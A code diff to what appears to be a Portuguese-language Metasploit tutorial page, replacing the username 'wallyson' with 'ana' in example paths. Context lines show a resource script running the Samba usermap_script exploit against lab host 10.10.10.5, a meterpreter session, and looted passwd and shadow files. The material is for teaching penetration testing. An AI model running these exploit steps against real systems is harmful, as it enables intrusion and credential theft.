@@ -67,7 +67,7 @@ Console  : 6.4.42-dev`,
             out: `[*] Importing 'Nmap XML' data
 [*] Import: Parsing with 'Nokogiri v1.16.7'
 [*] Importing host 10.10.10.5
-[*] Successfully imported /home/wallyson/scan.xml`,
+[*] Successfully imported /home/ana/scan.xml`,
             outType: "info",
           },
           {
@@ -324,7 +324,7 @@ meterpreter > `,
         language="bash"
         title="auto.rc — script reproduzível"
         code={`workspace -a auto_lab
-db_import /home/wallyson/scan.xml
+db_import /home/ana/scan.xml
 
 use exploit/multi/samba/usermap_script
 set RHOSTS 10.10.10.5
@@ -344,7 +344,7 @@ exploit -j -z
             out: `[*] Processing auto.rc for ERB directives.
 [*] resource (auto.rc)> workspace -a auto_lab
 [*] Added workspace: auto_lab
-[*] resource (auto.rc)> db_import /home/wallyson/scan.xml
+[*] resource (auto.rc)> db_import /home/ana/scan.xml
 [*] Importing 'Nmap XML' data
 [*] resource (auto.rc)> exploit -j -z
 [*] Exploit running as background job 0.
@@ -397,8 +397,8 @@ exploit -j -z
 ====
 host         service  type           name           content      info        path
 ----         -------  ----           ----           -------      ----        ----
-10.10.10.5            unix.passwd    passwd_data    text/plain   Linux       /home/wallyson/.msf4/loot/20260403131221_default_10.10.10.5_unix.passwd_982341.txt
-10.10.10.5            unix.shadow    shadow_data    text/plain   Linux hashes /home/wallyson/.msf4/loot/20260403131223_default_10.10.10.5_unix.shadow_141232.txt`,
+10.10.10.5            unix.passwd    passwd_data    text/plain   Linux       /home/ana/.msf4/loot/20260403131221_default_10.10.10.5_unix.passwd_982341.txt
+10.10.10.5            unix.shadow    shadow_data    text/plain   Linux hashes /home/ana/.msf4/loot/20260403131223_default_10.10.10.5_unix.shadow_141232.txt`,
             outType: "info",
           },
           {
